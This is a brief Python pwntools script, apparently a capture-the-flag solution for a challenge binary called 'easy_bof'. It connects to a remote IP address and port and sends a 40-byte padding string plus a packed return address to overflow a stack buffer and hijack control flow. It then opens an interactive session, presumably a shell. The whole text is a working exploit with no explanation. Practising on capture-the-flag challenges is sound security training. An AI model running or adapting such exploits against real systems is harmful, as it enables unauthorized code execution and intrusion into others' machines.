from pwn import *

elf = ELF('./easy_bof')
io = remote('34.146.50.22', 30002)
#io = process('./easy_bof')
io.sendline('a'*40+p64(0x4005e8))
io.interactive()
